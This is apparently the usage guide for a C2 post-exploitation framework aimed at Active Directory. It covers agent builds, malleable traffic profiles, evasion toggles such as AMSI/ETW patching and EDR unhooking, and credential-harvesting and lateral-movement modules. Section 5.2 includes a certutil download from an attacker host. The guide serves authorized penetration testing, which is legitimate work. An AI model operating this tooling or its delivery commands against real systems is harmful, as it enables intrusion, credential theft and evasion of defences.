# Caraxes C2 — Usage Guide

Caraxes is a modular Active Directory post-exploitation framework. It follows the principle of "avoiding command execution" — every operation is implemented through direct Win32 API calls, in-process BOF execution, or in-memory .NET assembly loading. The agent process never spawns a child process unless the operator explicitly requests it.

This document covers everything needed to set up, deploy, and operate the framework in an authorized penetration test.

---

## 1. Prerequisites

### Operator Machine (Linux/Kali)

- Python 3.10+
- MinGW-w64 cross-compiler (`sudo apt install mingw-w64`)
- Python packages: `pip install -r requirements.txt`

Required Python packages:

    prompt_toolkit >= 3.0
    rich >= 13.0
    pyyaml >= 6.0
    cryptography >= 41.0
    aiohttp >= 3.9
    dnspython >= 2.4
    msgpack >= 1.0

### Target Environment

- Windows 7 SP1 / Server 2008 R2 or later
- .NET Framework 4.0+ (present by default on all modern Windows)
- x64 (primary) or x86 architecture

---

## 2. Installation

```bash
git clone <repo-url> caraxes-c2
cd caraxes-c2
pip install -r requirements.txt

# Verify MinGW
x86_64-w64-mingw32-gcc --version
```

---

## 3. Initial Setup

### 3.1 Generate RSA Keys

The RSA keypair is used for the initial key exchange between agent and server. The public key is embedded in the agent binary at compile time.

```bash
python scripts/generate_keys.py
```

This creates:
- `keys/server_priv.pem` — RSA-2048 private key (kept on operator machine)
- `keys/server_pub.pem` — RSA-2048 public key (embedded in agent)

### 3.2 Generate TLS Certificates (for HTTPS listener)

```bash
# Self-signed (lab use)
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key \
    -out certs/server.pem -days 365 -nodes -subj "/CN=cdn.example.com"

# Or use Let's Encrypt for real engagements
```

### 3.3 Create a Malleable Profile (optional)

Place YAML profiles in `profiles/`. A profile controls how HTTP traffic looks on the wire — URI paths, headers, cookie names, response wrappers.

```yaml
# profiles/google_search.yaml
name: google_search
description: "HTTP traffic mimics Google search requests"

http:
  method: GET
  uri_paths:
    - "/search"
    - "/complete/search"
  data_embedding:
    request:
      location: cookie
      param_name: "NID"
      encoding: base64url
    response:
      location: body
      content_type: "text/html; charset=UTF-8"
      encoding: base64
      wrapper_before: |
        <!doctype html><html><head><title>Google</title></head><body>
        <div style="display:none">
      wrapper_after: |
        </div></body></html>
  headers:
    request:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      Accept: "text/html,application/xhtml+xml"
    response:
      Server: "gws"
      Cache-Control: "private, max-age=0"

agent:
  sleep: 60
  jitter: 25
  kill_date: "2026-12-31"
  working_hours: "08:00-18:00"
  working_days: "mon-fri"
```

---

## 4. Starting the Operator Client

```bash
# Basic — HTTPS listener on port 443
python -m client.main --listen-port 443 --cert certs/server.pem \
    --key certs/server.key --rsa-key keys/server_priv.pem

# With a malleable profile
python -m client.main --listen-port 8443 --cert certs/server.pem \
    --key certs/server.key --rsa-key keys/server_priv.pem \
    --profile profiles/google_search.yaml

# Custom modules directory
python -m client.main --modules-dir /opt/bofs --listen-port 443 \
    --cert certs/server.pem --key certs/server.key

# Debug mode
python -m client.main --debug --listen-port 8443
```

### Command-line Options

| Flag | Default | Description |
|------|---------|-------------|
| `--listen-host` | `0.0.0.0` | Listener bind address |
| `--listen-port` | `443` | Listener port |
| `--cert` | None | TLS certificate PEM |
| `--key` | None | TLS private key PEM |
| `--rsa-key` | None | RSA private key for key exchange |
| `--profile` | None | Malleable C2 profile YAML |
| `--modules-dir` | `./modules` | Directory containing BOF/assembly modules |
| `--log-dir` | `./logs` | Log output directory |
| `--debug` | off | Enable verbose debug logging |

On startup, you see the banner and a summary of loaded modules and active listeners:

```
   ______      __      __                             ________
  / ____/___ _/ /___ _/ /_  ____ ___________ ______  / ____/__ \
 / /   / __ `/ / __ `/ __ \/ __ `/ ___/ __ `/ ___/ / /    __/ /
/ /___/ /_/ / / /_/ / /_/ / /_/ (__  ) /_/ (__  ) / /___ / __/
\____/\__,_/_/\__,_/_.___/\__,_/____/\__,_/____/  \____//____/
                                          v1.0.0 | AD Post-Ex

[*] Loaded 47 modules
[*] Listener HTTPS on 0.0.0.0:443 [RUNNING]

main>
```

---

## 5. Agent Generation & Deployment

### 5.1 Generate an Agent

From the operator shell:

```
main> generate
```

Or with options:

```
main> generate --url https://cdn.example.com/api/v1 --sleep 30 --jitter 20
main> generate --arch x86 --kill-date 2026-12-31
main> generate --magic 0xCAFEBABE --output /tmp/svchost.exe
```

### Generate Options

| Flag | Default | Description |
|------|---------|-------------|
| `--url, -u` | Auto-detect from listener | C2 callback URL |
| `--sleep, -s` | `60` | Beacon interval in seconds |
| `--jitter, -j` | `25` | Jitter percentage (0–99) |
| `--arch, -a` | `x64` | Architecture: `x64` or `x86` |
| `--kill-date` | None | Agent self-destructs after `YYYY-MM-DD` |
| `--magic` | `0xDEADF00D` | Packet magic bytes (change per engagement) |
| `--output, -o` | `builds/agent_ARCH.exe` | Output path |

The build script:

1. Patches `config.h` with the specified C2 URL, sleep, jitter, kill date, magic bytes
2. Embeds the RSA public key from `keys/server_pub.pem`
3. Cross-compiles with MinGW-w64
4. Strips symbols
5. Outputs the final `.exe`

### 5.2 Deploy the Agent

Transfer the generated `.exe` to the target and execute it. Common delivery methods:

- Upload via existing access (web shell, RDP, etc.)
- `certutil -urlcache -f https://attacker/agent.exe C:\Windows\Temp\agent.exe`
- Host on SMB share and execute via `\\attacker\share\agent.exe`
- Use `psexec`, `wmiexec`, or similar for remote execution

The agent will:

1. Run anti-analysis checks (if enabled)
2. Collect system information
3. Perform ECDH key exchange with the C2
4. Begin beaconing at the configured interval

### 5.3 Evasion Features (Build-Time Toggles)

These are controlled in `config.h` and enabled/disabled at compile time:

| Toggle | Default | Description |
|--------|---------|-------------|
| `CONFIG_ANTI_DEBUG` | ON | Detect debuggers at startup |
| `CONFIG_ANTI_SANDBOX` | ON | Detect VM/sandbox environments |
| `CONFIG_PATCH_AMSI` | ON | Patch `AmsiScanBuffer` to bypass AMSI |
| `CONFIG_PATCH_ETW` | ON | Patch `EtwEventWrite` to suppress CLR events |
| `CONFIG_UNHOOK_NTDLL` | ON | Restore ntdll.dll from disk (remove EDR hooks) |
| `CONFIG_SLEEP_OBFUSCATE` | ON | Encrypt agent memory during sleep |
| `CONFIG_STACK_SPOOF` | OFF | Spoof thread call stack during sleep |
| `CONFIG_INDIRECT_SYSCALLS` | OFF | Use Hell's Gate indirect syscalls |
| `CONFIG_PE_STOMP` | ON | Zero PE headers in memory after init |
| `CONFIG_API_HASHING` | ON | Resolve APIs via PEB walking + DJB2 hash |
| `CONFIG_MODULE_STOMP` | OFF | Use module stomping for payload loading |

---

## 6. Operator Shell — Main Context

When no agent is selected, you are in the **main context**.

### 6.1 Available Commands

| Command | Description |
|---------|-------------|
| `help` | Show all main context commands |
| `agents` | List all connected agents |
| `interact <id>` | Select an agent to interact with |
| `listeners` | List active listeners |
| `listeners list` | List active listeners |
| `listeners stop <id>` | Stop a listener |
| `modules` | List all loaded modules |
| `modules list` | List all loaded modules grouped by category |
| `modules search <query>` | Search modules by name, tag, or description |
| `generate [opts]` | Generate a new agent binary |
| `exit` | Shutdown the operator client |

### 6.2 Listing Agents

```
main> agents
  ID   Hostname   User              PID    Arch   Channel  Last
  1    DC01       CORP\admin         4728   x64    HTTPS    2s
  2    WS04       CORP\jsmith        8812   x64    HTTPS    14s
  3    SRV02      CORP\svc_sql       3104   x64    HTTPS    47s
```

### 6.3 Interacting with an Agent

```
main> interact 1
[*] Interacting with agent 1 (DC01)
[agent 1][DC01][CORP\admin][HIGH][x64][PID:4728] C:\Windows\System32>
```

---

## 7. Operator Shell — Agent Context

Once you `interact` with an agent, the prompt changes and you have access to agent-specific commands plus all loaded modules.

### 7.1 Built-in Commands

| Command | Description |
|---------|-------------|
| `help` | Show all agent commands and loaded modules |
| `help <module>` | Show detailed usage, arguments, OPSEC notes for a module |
| `info` | Display agent metadata (OS, .NET version, PID, integrity, etc.) |
| `sleep <sec> [jitter%]` | Change beacon interval and jitter |
| `clear` | Clear all pending (unsent) tasks for this agent |
| `back` | Return to main context |
| `exit` | Kill the agent process (prompts for confirmation) |
| `modules [list\|search]` | Browse/search module registry |

### 7.2 File Operations

```
upload <local_path> <remote_path>
```
Upload a file from the operator machine to the target.

```
download <remote_path> [local_path]
```
Download a file from the target to the operator machine.

The agent implements file operations via kernel32 `CreateFileW`, `ReadFile`, `WriteFile` — no child processes.

### 7.3 Executing BOF Files

```
bof <path_to.o> [args...]
```

Load and execute an arbitrary Beacon Object File in the agent's process. The agent contains a full COFF loader that supports all AMD64 relocation types and provides Beacon API compatibility (`BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, etc.).

Compatible with:
- TrustedSec Situational Awareness BOFs
- Outflank C2-Tool-Collection
- Any standard Cobalt Strike BOF

```
[agent 1][DC01] /> bof /opt/bofs/whoami.x64.o
[green]BOF queued: whoami.x64.o (2847B)[/green]
```

### 7.4 Executing .NET Assemblies

```
assembly <path_to.exe> [args...]
```

Load a .NET assembly entirely in memory via `Assembly.Load(byte[])` and execute its entry point. Console output is captured and returned.

```
[agent 1][DC01] /> assembly /opt/tools/Seatbelt.exe -group=all
[green]Assembly queued: Seatbelt.exe (418304B)[/green]
```

AMSI is patched before loading (if `CONFIG_PATCH_AMSI` is enabled), and ETW .NET CLR events are suppressed (if `CONFIG_PATCH_ETW` is enabled).

### 7.5 Shell Commands (Dangerous)

```
shell <command>
powershell <command>
```

These spawn `cmd.exe` or `powershell.exe` as a child process. The operator receives a warning before execution because process creation is highly visible to EDR.

```
[agent 1][DC01] /> shell whoami /all
WARNING: 'shell' spawns a child process. Detectable by EDR/AV. Continue? (y/N)
```

### 7.6 Executing Registered Modules

Any loaded module can be run by name:

```
<module_name> [--arg1 value1] [--arg2 value2]
```

Arguments are passed as `--name value` pairs. The module registry validates required arguments, checks agent version compatibility, and warns on high-OPSEC modules before dispatch.

```
[agent 1][DC01] /> enumdomainusers --domain corp.local --filter "(&(adminCount=1))"
Task queued: enumdomainusers (id: a3f2c1d8)
```

---

## 8. Native Agent Modules

These modules are compiled into the agent binary and execute directly via Win32 API calls. They never require uploading a BOF or assembly.

### 8.1 System Information

**whoami** — Current user context, privileges, group membership, token type, integrity level, elevation status, logon server.

```
[agent 1] /> whoami
```

**ps** — List running processes. Uses `NtQuerySystemInformation(SystemProcessInformation)` — no per-process `OpenProcess` calls, so no ACCESS_DENIED audit events.

```
[agent 1] /> ps
```

### 8.2 File Operations

**ls** — List directory contents. Uses `FindFirstFileW` / `FindNextFileW`.

```
[agent 1] /> ls C:\Users
```

**cat** — Read file contents. Uses `CreateFileW` / `ReadFile`.

```
[agent 1] /> cat C:\Windows\System32\drivers\etc\hosts
```

**upload** / **download** — Transfer files between operator and target.

```
[agent 1] /> upload /tmp/mimikatz.exe C:\Windows\Temp\debug.exe
[agent 1] /> download C:\Users\admin\Desktop\passwords.xlsx
```

### 8.3 Network Enumeration

**net_tcp** — Enumerate all TCP connections with PIDs (equivalent to `netstat -ano -p tcp`). Covers IPv4 and IPv6. Uses `GetExtendedTcpTable`.

**net_udp** — Enumerate UDP listeners with PIDs. Uses `GetExtendedUdpTable`.

**net_arp** — Dump the ARP cache (IP-to-MAC mappings). Useful for host discovery on the local subnet. Uses `GetIpNetTable`.

**net_routes** — Show the routing table. Identifies network segments, gateways, and potential pivot points. Uses `GetIpForwardTable`.

**net_dns** — Dump the DNS client cache. Reveals recently resolved internal hostnames. Uses the undocumented `DnsGetCacheDataTable` export from `dnsapi.dll`.

**net_interfaces** — List all network interfaces with IP addresses, MACs, gateways, DNS servers, DHCP status, and DNS suffix. Uses `GetAdaptersAddresses`.

### 8.4 Port Scanner

**portscan** — Async TCP port scanner with thread pool, CIDR expansion, and banner grabbing.

Supports:
- Single IPs, comma-separated lists, CIDR notation (`192.168.1.0/24`)
- Port ranges (`1-1024`), comma-separated ports (`22,80,443,3389`)
- Built-in port presets for common scenarios
- Configurable thread count (default 50, max 128)
- Configurable timeout per connection (default 1000ms)
- Optional banner grabbing

```
[agent 1] /> portscan --targets 10.0.0.0/24 --ports 22,80,135,389,445,3389 --threads 100
[agent 1] /> portscan --targets 10.0.0.5 --ports 1-65535 --timeout 500
```

Port presets for reference (used in BOF modules):
- **AD ports**: 53, 88, 135, 139, 389, 445, 464, 636, 3268, 3269
- **Web**: 80, 443, 8080, 8443, 8000, 8888
- **Database**: 1433, 1521, 3306, 5432, 6379, 27017
- **Remote access**: 22, 3389, 5900, 5985, 5986

### 8.5 Screenshot

**screenshot** — Capture the desktop via GDI `BitBlt`. Returns a BMP file in memory.

```
[agent 1] /> screenshot
[agent 1] /> screenshot --all    # All monitors (virtual desktop)
```

Uses `GetDC(NULL)` → `CreateCompatibleDC` → `CreateCompatibleBitmap` → `BitBlt(SRCCOPY)` → `GetDIBits`. No external tools, no temporary files on disk.

### 8.6 Registry Operations

**reg_query** — Read a single registry value.

```
[agent 1] /> reg_query --root HKLM --subkey "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName
```

**reg_enum_values** — List all values under a registry key.

**reg_enum_subkeys** — List all subkeys under a registry key.

**reg_set** — Write a registry value (use with caution).

**reg_delete** — Delete a registry value.

**reg_autoruns** — Enumerate persistence locations: Run/RunOnce keys, Winlogon, services with non-standard image paths. Checks both HKLM and HKCU.

```
[agent 1] /> reg_autoruns
HIVE    KEY                                                  VALUE         DATA
HKLM    SOFTWARE\Microsoft\Windows\CurrentVersion\Run        SecurityHealth  %windir%\system32\SecurityHealthSystray.exe
HKLM    Services\suspicious_svc                              ImagePath     C:\ProgramData\svc.exe
```

**reg_creds** — Search for saved credentials: autologon passwords, PuTTY sessions, WinSCP sessions, VNC encrypted passwords, SNMP community strings.

```
[agent 1] /> reg_creds
SOURCE     USER/KEY              VALUE
Autologon  CORP\admin            P@ssw0rd!
PuTTY      admin@10.0.0.5        (session: DC01)
WinSCP     root@192.168.1.10     (password saved)
SNMP       Community             public
```

**reg_software** — List installed software from the Uninstall registry (both native and WoW64).

**reg_secpolicy** — Audit security-relevant settings:

```
[agent 1] /> reg_secpolicy
POLICY                    STATUS                  DETAIL
UAC                       ENABLED                 EnableLUA=1
UAC Admin Behavior        5                       Prompt for consent (non-Windows)
WDigest Plaintext         DISABLED                (key not present, default off)
LSA Protection            ENABLED (LSASS protected)  RunAsPPL=1
Credential Guard          Enabled with UEFI lock  LsaCfgFlags=1
PS ExecutionPolicy        RemoteSigned            Machine-level
LAPS                      INSTALLED               Check ms-Mcs-AdmPwd attribute in AD
Firewall                  Domain=ON Private=ON Public=ON
AlwaysInstallElevated     Not vulnerable          HKLM=0 HKCU=0
```

This output directly informs your attack path — e.g., if WDigest is enabled, cleartext credentials are in LSASS memory. If AlwaysInstallElevated is set, you can privesc via MSI.

### 8.7 Credential Harvesting

**cred_vault** — Dump Windows Vault entries using `vaultcli.dll`. Shows resource, identity, and last modified timestamp.

**cred_credman** — Dump Windows Credential Manager using `CredEnumerateW`. Extracts readable passwords from generic and visible-password credential types.

```
[agent 1] /> cred_credman
TARGET                          USERNAME           TYPE              PASSWORD              LAST_WRITTEN
Domain:target=TERMSRV/dc01     CORP\admin         DOMAIN_PASSWORD   (32 bytes, encrypted)  2026-01-15
git:https://github.com         jsmith             GENERIC           ghp_xK9...            2026-03-20
```

**cred_wifi** — Extract saved Wi-Fi profile passwords. Uses `wlanapi.dll` with the `WLAN_PROFILE_GET_PLAINTEXT_KEY` flag.

```
[agent 1] /> cred_wifi
SSID             AUTH       ENCRYPTION   PASSWORD
CorpNet          WPA2PSK    AES          Summer2026!
GuestWifi        open       none         (none)
```

Requires running as SYSTEM to read all profiles. A regular user can only read their own.

**cred_rdp** — Enumerate saved RDP connections from `HKCU\Software\Microsoft\Terminal Server Client\Servers`. Shows hostnames and username hints.

**cred_cloud** — Check for cloud credential files on disk. Reports existence and size (does NOT read contents — use `download` to retrieve):

```
[agent 1] /> cred_cloud
PATH                                              SIZE
C:\Users\admin\.aws\credentials                   487 bytes
C:\Users\admin\.ssh\id_rsa                         1679 bytes
C:\Users\admin\.kube\config                        2341 bytes
C:\Users\admin\.docker\config.json                 198 bytes
```

Files checked: AWS credentials/config, Azure access tokens, GCP credentials, Kubernetes config, Docker config, SSH keys (RSA/Ed25519/ECDSA), Git credentials, Terraform credentials, HashiCorp Vault tokens.

### 8.8 SOCKS5 Proxy

**socks_start** — Start an in-agent SOCKS5 proxy that tunnels traffic through the C2 channel. The operator side handles SOCKS5 negotiation; the agent makes raw TCP connections and relays data.

Once active, you can proxy tools through the compromised host:

```bash
# On operator machine, configure proxychains or Burp to use the SOCKS5 port
proxychains crackmapexec smb 10.0.0.0/24
proxychains impacket-secretsdump corp.local/admin@10.0.0.1
```

Supports up to 64 concurrent connections with a 5-minute idle timeout.

### 8.9 Token Operations

**token_whoami** — Enhanced version of `whoami` with Credential Guard detection, full privilege listing, group membership, token type and impersonation level.

**token_make** — Create a new logon token with credentials. Defaults to `LOGON32_LOGON_NEW_CREDENTIALS` (type 9) to avoid triggering interactive logon events.

**token_impersonate** — Impersonate a token from another process. Supports privilege filtering — strip dangerous privileges or keep only a minimal set.

**token_revert** — Revert to the original token.

**token_sessions** — Enumerate logon sessions via `LsaEnumerateLogonSessions`.

---

## 9. Module System (BOF / Assembly / Native)

### 9.1 Module Types

| Type | Runs As | Description |
|------|---------|-------------|
| `native` | Built into agent binary | Core operations (file ops, network, etc.) |
| `bof` | COFF object loaded at runtime | Compiled C code, sent from operator per-task |
| `assembly` | .NET Assembly.Load in-memory | .NET executables loaded reflectively |

### 9.2 Module Discovery

The operator client scans the `modules/` directory recursively on startup. Each module is a directory containing a `module.yaml` manifest and (for BOF/assembly) a `bin/` folder with the compiled payload.

```
modules/
├── enumeration/
│   ├── enumdomainusers/
│   │   ├── module.yaml
│   │   ├── src/enumdomainusers.c
│   │   ├── bin/enumdomainusers.x64.o
│   │   └── bin/enumdomainusers.x86.o
│   └── ...
├── credentials/
│   ├── kerberoast/
│   └── ...
└── ...
```

### 9.3 Module Manifest (module.yaml)

Every module has a YAML manifest that declares its metadata, arguments, compatibility, output format, and OPSEC rating.

```yaml
name: kerberoast
category: credentials
description: >
  Kerberoast accounts with SPNs via LDAP + SSPI.
  Uses wldap32.dll and secur32.dll directly.

author: "operator"
version: "1.0.0"

execution_type: bof
bof_file: kerberoast.x64.o
entry_point: go
bof_arch: x64

compatibility:
  agent_min_version: "1.0.0"
  dotnet_min_version: "4.0"
  os:
    - windows_server_2016
    - windows_server_2019
    - windows_server_2022
    - windows_10
    - windows_11

arguments:
  - name: domain
    type: string
    pack_type: z
    required: false
    default: ""
    description: "Target domain FQDN. Empty = current domain."
    example: "corp.local"

  - name: spn
    type: string
    pack_type: z
    required: false
    default: ""
    description: "Specific SPN filter. Empty = all SPNs."

  - name: hashcat
    type: int
    pack_type: i
    required: false
    default: 1
    description: "1 = hashcat format, 0 = John format"

output_format: raw
opsec_level: low
opsec_notes: >
  Uses standard LDAP queries and Kerberos TGS requests.
  Normal domain-joined behavior. Volume may alert.

timeout: 120
tags: [kerberos, credentials, spn, cracking]
mitre_attack_id: T1558.003
references:
  - https://attack.mitre.org/techniques/T1558/003/
```

### 9.4 Argument Types and Wire Encoding

Arguments are serialized to match the Cobalt Strike `BeaconDataParse` format so existing BOFs work unchanged:

| Pack Type | Wire Format | Description |
|-----------|-------------|-------------|
| `z` | `[4B length][UTF-8 + \0]` | ANSI string |
| `Z` | `[4B length][UTF-16LE + \0\0]` | Wide string |
| `i` | `[4B LE value]` | 32-bit integer |
| `s` | `[2B LE value]` | 16-bit short |
| `b` | `[4B length][raw bytes]` | Binary blob |

### 9.5 Retrocompatibility

Before dispatching a module to an agent, the operator validates:

1. Agent version is within `[agent_min_version, agent_max_version]`
2. .NET version is within `[dotnet_min_version, dotnet_max_version]`
3. If the module is `opsec_level: high`, the operator is prompted to confirm

If validation fails, the module is blocked with an error message. The agent never receives an incompatible module.

### 9.6 Output Formatting

Modules declare their output format in the manifest:

| Format | Description |
|--------|-------------|
| `raw` | Free-form text (BeaconPrintf output) |
| `table` | Structured rows with defined columns and optional transforms |
| `json` | JSON-formatted output |
| `file` | Binary file data (for download results, screenshots, etc.) |

Column transforms automatically convert raw values:
- `windows_filetime_to_datetime` — Windows FILETIME to `YYYY-MM-DD HH:MM:SS`
- `uac_to_enabled_bool` — UAC bitmask to readable flags
- `sid_to_name` — SID to `DOMAIN\username`
- `epoch_to_datetime` — Unix epoch to datetime

### 9.7 Module Categories

| Category | Description |
|----------|-------------|
| `enumeration` | AD/network reconnaissance (users, groups, computers, trusts, shares, ACLs) |
| `credentials` | Credential extraction (Kerberoast, AS-REP roast, DCSync, LSASS dump) |
| `tickets` | Kerberos ticket manipulation (forge, extract, inject, convert, renew) |
| `lateral_movement` | Remote execution (WMI, SMB, DCOM, PSExec, WinRM, SCShell) |
| `privesc` | Privilege escalation (token impersonation, RBCD, ADCS, PrintSpoofer) |
| `persistence` | Persistence mechanisms (golden/silver tickets, DCShadow, scheduled tasks) |
| `evasion` | Runtime evasion (AMSI patch, ETW patch, ntdll unhook, PPID spoof) |
| `utility` | Built-in agent operations (file, process, network, registry) |

---

## 10. C2 Channels

### 10.1 HTTPS (Primary)

The default and most common channel. Agent polls the server at `sleep + jitter` intervals via HTTP(S) requests shaped by the malleable profile.

Flow:
1. Agent sends HTTP request with encrypted check-in data (embedded in cookie/header/body per profile)
2. Server extracts data, decrypts, processes, and returns any pending tasks in the HTTP response
3. Agent decrypts response and executes tasks
4. Results are sent on the next check-in (or immediately via a separate POST)

### 10.2 SMB Named Pipe

Used for agent-to-agent chaining inside a network. A parent agent (with external HTTP access) runs a named pipe server. Child agents on internal hosts connect to the pipe.

```
Operator ←──HTTPS──→ Agent1(DC01) ←──SMB Pipe──→ Agent2(WS04)
                                   ←──SMB Pipe──→ Agent3(SRV02)
```

The parent relays traffic between the operator and child agents. Pipe names are configurable (default: `\\.\pipe\spoolsvc`).

### 10.3 DNS

Slowest channel. Used when HTTP and SMB are blocked. Data is encoded as DNS queries (Base32 in subdomain labels) to an attacker-controlled authoritative DNS server.

Effective throughput: ~1–5 KB/s. File transfers over DNS trigger a size/time warning.

### 10.4 Channel Fallback

The agent attempts channels in priority order (configurable via `CONFIG_CHANNEL_PRIORITY`). If a channel fails 5 consecutive times (`CONFIG_CHANNEL_MAX_FAILURES`), the agent falls back to the next channel:

1. HTTPS → 2. TCP → 3. DNS → 4. SMB (peer) → 5. Extended sleep (1 hour), retry from 1.

---

## 11. Wire Protocol

All C2 traffic (regardless of channel) uses the same binary protocol.

### 11.1 Packet Format

```
[MAGIC 4B][SIZE 4B][MSG_ID 4B][ENCRYPTED PAYLOAD]
```

- **MAGIC**: 4-byte constant (default `0xDEADF00D`, configurable per build)
- **SIZE**: Total packet size including header
- **MSG_ID**: Monotonically increasing counter (replay detection)
- **ENCRYPTED PAYLOAD**: AES-256-GCM encrypted TLV body

### 11.2 Encryption

- **Initial key exchange**: ECDH P-256, bootstrapped via RSA-2048 (public key baked into agent)
- **Session encryption**: AES-256-GCM with HKDF-derived session key
- **Nonce management**: 12-byte nonce = 4-byte agent_id prefix + 8-byte counter. Agent uses even counters, server uses odd counters.

### 11.3 Command Types

| Byte | Command | Direction |
|------|---------|-----------|
| `0x01` | `CHECKIN_REQUEST` | Agent → Server |
| `0x02` | `CHECKIN_RESPONSE` | Server → Agent |
| `0x03` | `TASK_RESULT` | Agent → Server |
| `0x04` | `TASK_RESULT_ACK` | Server → Agent |
| `0x10` | `KEY_EXCHANGE_INIT` | Agent → Server |
| `0x11` | `KEY_EXCHANGE_RESP` | Server → Agent |
| `0x20` | `HEARTBEAT` | Agent → Server |
| `0xF0` | `SOCKS_DATA` | Bidirectional |
| `0xFF` | `TERMINATE` | Server → Agent |

---

## 12. Logging

The operator client writes two log streams in JSONL format:

### 12.1 Operator Log

`logs/operator_YYYY-MM-DD.jsonl` — Every command typed, every response received, across all agents.

### 12.2 Per-Agent Log

`logs/agent_{id}_{hostname}.jsonl` — All traffic for a specific agent: commands, results, duration, output previews.

### 12.3 Traffic Log

`logs/traffic_YYYY-MM-DD.jsonl` — Raw encrypted packet hex for forensic replay (direction, agent_id, encrypted bytes, decrypted size).

---

## 13. Developing New Modules

### 13.1 Scaffold a New Module

```bash
python scripts/create_module.py --name enumgpos --category enumeration --type bof
```

This creates:
```
modules/enumeration/enumgpos/
├── module.yaml    (template manifest)
├── src/
│   └── enumgpos.c (template BOF source)
└── bin/           (empty, for compiled output)
```

### 13.2 Write the BOF

```c
#include "beacon_compat.h"

// Dynamic resolution: LIBRARY$Function
DECLSPEC_IMPORT LDAP* LDAPAPI WLDAP32$ldap_initW(PWSTR, ULONG);
// ... more imports

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* domain = BeaconDataExtract(&parser, NULL);
    // ... your logic ...

    BeaconPrintf(CALLBACK_OUTPUT, "Found %d results\n", count);
}
```

### 13.3 Compile

```bash
# Single module
x86_64-w64-mingw32-gcc -c -Os -fno-asynchronous-unwind-tables \
    -I../../shared/include \
    -o bin/enumgpos.x64.o src/enumgpos.c

# All modules
make -f Makefile.bofs
```

### 13.4 Write the Manifest

Fill in `module.yaml` with arguments, output format, OPSEC level, and compatibility information.

### 13.5 Test

Restart the operator client (it auto-discovers modules on startup). The module appears in `modules list` and is available in agent context:

```
[agent 1] /> enumgpos --domain corp.local
```

---

## 14. OPSEC Considerations

### 14.1 By Module Risk Level

**Low OPSEC (normal domain behavior):**
- LDAP queries (enumdomainusers, enumdomaingroups, enumspns)
- DNS queries (dnsquery)
- Registry reads (reg_query, reg_secpolicy)
- Process listing (ps)
- Network enumeration (net_tcp, net_arp, net_interfaces)

**Medium OPSEC (may trigger alerts on sensitive hosts):**
- Kerberos TGS requests (kerberoast) — volume-based detection
- ARP scanning + port scanning — network anomaly detection
- Token impersonation — Sysmon event 10
- Screenshot capture — unusual GDI calls from non-GUI process

**High OPSEC (likely triggers alerts):**
- DCSync — requires specific AD permissions, logs DirSync events
- LSASS access — protected process, EDR hooks
- Service creation (psexec, smbexec) — Sysmon event 13, service events
- Process injection — Sysmon events 8, 10
- Golden/Silver ticket forgery — detectable by PAC validation

### 14.2 What the Agent Does NOT Do

The agent avoids these detectable behaviors by default:
- No child processes spawned (unless `shell`/`powershell` explicitly used)
- No PowerShell.exe invocation
- No `cmd.exe` invocation
- No temporary files written to disk (assembly loading is in-memory)
- No WMI event subscriptions
- No scheduled task creation (unless explicitly requested)
- No service installation (unless explicitly requested)

### 14.3 What the Agent DOES to Evade

- Patches AMSI before any `Assembly.Load`
- Patches ETW to suppress .NET CLR telemetry
- Restores ntdll.dll from disk to remove EDR hooks
- Encrypts its own memory during sleep
- Stomps PE headers to prevent memory scanners from identifying it
- Resolves sensitive APIs via PEB walk (no `GetProcAddress` strings in binary)
- Uses malleable HTTP profiles to blend with normal traffic
- Implements channel fallback to survive network filtering changes

---

## 15. Operational Workflow — Typical Pentest

### Phase 1: Initial Access

```bash
# Generate agent
main> generate --url https://cdn.example.com/api/v1 --sleep 5 --jitter 10

# Deploy (via whatever initial access you have)
# Wait for check-in
main> agents
```

### Phase 2: Situational Awareness

```
main> interact 1

# Who am I? What can I do?
[agent 1] /> whoami
[agent 1] /> reg_secpolicy
[agent 1] /> ps

# Network position
[agent 1] /> net_interfaces
[agent 1] /> net_routes
[agent 1] /> net_arp
[agent 1] /> net_dns

# Evidence capture
[agent 1] /> screenshot
```

### Phase 3: Credential Discovery

```
# Check for low-hanging fruit
[agent 1] /> reg_creds
[agent 1] /> cred_credman
[agent 1] /> cred_wifi
[agent 1] /> cred_cloud
[agent 1] /> cred_rdp

# AD enumeration
[agent 1] /> enumdomainusers
[agent 1] /> enumspns
[agent 1] /> kerberoast --hashcat 1
```

### Phase 4: Lateral Movement

```
# Scan for targets
[agent 1] /> portscan --targets 10.0.0.0/24 --ports 445,3389,5985

# Move laterally
[agent 1] /> wmiexec --target 10.0.0.5 --command "C:\Windows\Temp\agent.exe"

# Or use SOCKS proxy for tool tunneling
[agent 1] /> socks_start
# On Kali: proxychains crackmapexec smb 10.0.0.0/24
```

### Phase 5: Persistence & Reporting

```
# Document findings
[agent 1] /> reg_software
[agent 1] /> screenshot

# Increase sleep before leaving
[agent 1] /> sleep 3600 50

# Clean up
[agent 1] /> back
main> exit
```

---

## 16. Troubleshooting

### Agent Not Checking In

1. Verify the C2 URL is reachable from the target: `curl -k https://c2.example.com/api/v1`
2. Check the listener is running: `listeners` in the operator shell
3. Check TLS certificate validity
4. Check firewall rules (the target must be able to reach the listener port)
5. If the agent has a kill date, verify it hasn't passed
6. If using a malleable profile, ensure the agent was built with the matching profile

### BOF Execution Fails

1. Verify architecture matches: `x64` BOFs only work on `x64` agents
2. Check the COFF header: `xxd -l 2 -p module.x64.o` should show `6486` (x64) or `4c01` (x86)
3. Verify all DLL imports are resolvable on the target OS
4. Check the entry point name (default: `go`)

### Module Not Found

1. Verify the module directory contains a valid `module.yaml`
2. Check the operator startup log for "Skipping" warnings
3. Verify the YAML syntax is valid: `python -c "import yaml; yaml.safe_load(open('module.yaml'))"`

### Assembly Load Fails

1. AMSI may be blocking — verify `CONFIG_PATCH_AMSI` is enabled
2. The assembly must target .NET Framework (not .NET Core/5+)
3. Check that the assembly has a `static void Main(string[] args)` entry point
4. Large assemblies may timeout — increase the module timeout

### High Memory Usage

1. Large BOFs or assemblies stay in memory after execution — this is by design (no disk I/O)
2. The SOCKS proxy allocates 64KB per connection — close idle connections
3. Port scan results buffer is allocated proportionally to target count × port count

---

## 17. Project Structure Reference

```
caraxes-c2/
├── client/                    Python operator client
│   ├── main.py                Entry point
│   ├── cli/                   Interactive shell, completions, commands
│   ├── core/                  Session manager, task manager, module registry
